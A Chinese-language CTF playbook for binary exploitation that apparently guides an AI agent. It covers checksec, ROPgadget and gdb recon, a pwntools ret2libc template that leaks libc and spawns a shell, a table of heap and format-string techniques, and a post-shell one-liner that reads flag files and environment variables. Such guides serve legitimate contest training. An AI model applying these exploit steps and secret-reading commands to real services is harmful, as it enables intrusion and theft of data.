# Pwn 二进制漏洞利用 playbook

## 0. 铁律(实测教训)
1. **一律在 `orb -m pwn64` 里做** —— 本机 macOS arm64 跑不了 amd64 二进制。
2. **先直接打远程**,不要一上来就搭本地复现环境(改 ld.so、LD_PRELOAD、找匹配 libc 那套极费时;
   实测有 agent 在这上面耗掉 10 分钟还没开始打)。远程行为异常时才用 gdb 定点调试。
3. 题目给了 libc 就直接用它算偏移,别猜版本。

## 1. 标准流程
```bash
orb -m pwn64 bash -lc 'cd <工作区>/files && checksec --file=./chall && file ./chall'
orb -m pwn64 bash -lc 'readelf -s ./chall | head -30; strings -a ./chall | grep -iE "flag|sh|system"'
orb -m pwn64 bash -lc 'objdump -d ./chall | grep -A12 "<main>:"'      # 找溢出点
orb -m pwn64 bash -lc 'ROPgadget --binary ./chall | grep -E "pop rdi|pop rsi|pop rdx|leave|syscall" | head'
```

## 2. pwntools 模板(改就用)
```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')
elf  = ELF('./chall')
libc = ELF('./libc.so.6') if os.path.exists('./libc.so.6') else None
io = remote('TARGET_IP', TARGET_PORT)          # 容器题地址按平台给的填
io.recvuntil(b'> ')
payload = b'A'*0x50 + p64(0x400783)
io.sendline(payload)
io.interactive()
```
关键几行:泄露 `leak = u64(io.recvline().strip().ljust(8, b'\x00'))`;libc 基址 `base = leak - libc.symbols['puts']`;
`system = base + libc.symbols['system']`;`binsh = base + next(libc.search(b'/bin/sh'))`;栈对齐用 `ret` 垫一下。

## 3. 题型对照
| 检查结果 | 打法 |
|---|---|
| 无 PIE 无 canary + 溢出 | ret2text / ret2libc(泄露 → 算 system → getshell) |
| 有 canary | 泄露 canary(格式化字符串 / write 溢出读),或 `__stack_chk_fail` |
| 没有 system/bin/sh | ROP 拼 execve 或 syscall;有 seccomp 只能 open/read/write |
| 格式化字符串 | `%p` 泄露、`%n` 任意写(GOT 表)、`%s` 读内存 |
| 堆题 | tcache/fastbin dup、UAF、`__free_hook`/`__malloc_hook`(glibc<2.34) |
| 32 位 | 参数走栈,`pop;pop;ret` 依次压参 |

## 4. 调试
```bash
orb -m pwn64 bash -lc 'gdb -q ./chall -ex "b *main+0" -ex r'
orb -m pwn64 bash -lc 'gdb -q ./chall -ex "run < in.txt" -ex "bt" -ex "info registers"'
```

## 5. 收尾(省轮次)
拿到 shell 后一次性全打:`id; ls -la; cat flag* /flag /flag.txt 2>/dev/null; env | grep -i flag`。

## flag 格式(实测踩过)
前缀**不固定**,见过 `NSSCTF{...}`、`flag{...}`、`LitCTF{...}` 等。提交前先看题目描述/容器 banner/回显/附件里有没有格式提示。
若第一次被拒,**优先检查前缀**再改内容;同一格式别重复提交(错误次数多会被判失败,靶场上限 20 次)。


## libc 怎么处理(线下赛的实际情况:题目给 libc,有时连 ld 一起给)

**原则:题目给了什么就用什么,不要自己去查/下载 libc。** 只有啥都没给时才需要识别(见最后一节)。

### 情况 A:给了 libc + ld(最省事,能本地复现)
```bash
# 让二进制用题目给的 ld + libc 跑,本地行为与远程一致
patchelf --set-interpreter ./ld-2.31.so --set-rpath . ./chall
./chall                      # 或 pwntools process('./chall')
```
- 偏移**直接从题目给的 libc 里取**(不需要识别):
  ```python
  libc = ELF('./libc.so.6')
  system = base + libc.symbols['system']
  binsh  = base + next(libc.search(b'/bin/sh'))
  ```
- 本地/远程用的是同一份 libc → 泄露算出的基址与偏移可以直接互验。

### 情况 B:只给 libc(没给 ld。线下常见)
- **偏移照样用题目给的 libc**,完全不需要"识别 libc"这一步;
- 本地一般**跑不起来**(缺匹配的 ld,`LD_PRELOAD` 通常也不行)→ 别在这上面耗时间,
  **优先直接打远程**:`io = remote(ip, port)` → 泄露 `puts` → `base = leak - libc.symbols['puts']` → 打二段;
- 只想验证调用链逻辑时,可以用系统 libc 本地跑,但**偏移必须以题目给的 libc 为准**。

### 情况 C:既没 libc 也没 ld(线上赛/靶场常见,线下少见)
- 这时才需要识别:用远程泄露的多个符号在本地库里查(VM 里自带,2736 个 libc):
  ```bash
  orb -m pwn64 bash -lc 'cd ~/libc-database && ./find puts <低3位> read <低3位>'
  orb -m pwn64 bash -lc 'cd ~/libc-database && ./get libc6_2.31-0ubuntu9_amd64'   # 取出候选 libc
  ```
- **禁止联网识别**(`libc.rip` 等在线服务在比赛环境不可用)。

## 环境要点(省时间,实测踩坑)
- **pwn64 与 macOS 共享同一文件系统**:工作区在 VM 里路径一样可见(如 `<项目根>/work/pwn-xxx/files/chall`),
  **不需要把二进制拷到 /tmp**;直接 `orb -m pwn64 bash -lc 'cd <工作区> && python3 exp.py'`。
- 每条 bash 都是**全新 shell**:cwd 固定为你的工作目录;题目根目录用 `cd ..`,附件在 `../files/`(少写长绝对路径)。
- 可用工具:`gdb`、`checksec`、`ROPgadget`、`ropper`、`patchelf`(无 pwndbg/gef、无 one_gadget;
  找 execve gadget 用 `ROPgadget --only "execve|syscall"`,或直接拼 `system('/bin/sh')`)。

## 小心"诱饵 flag"(实测踩坑)
二进制/附件里出现的 `flag{...}` 字符串**可能是诱饵**(例如 `flag{tcache_vault_local_pwned}` 这种明显是假的),
真 flag 一般在**服务端的 flag 文件**里(拿到 shell 后 `cat flag* /flag`),或题目/平台上另有说明。
- 优先提交**从目标环境实际读到**的 flag(远程文件、数据库、接口返回),而不是从二进制里抠出来的字符串;
- 若提交被拒且你交的是"二进制里找到的",换去读服务端文件;正确 flag 通常形如 `NSSCTF{...}` / `flag{...}` 且带随机串。
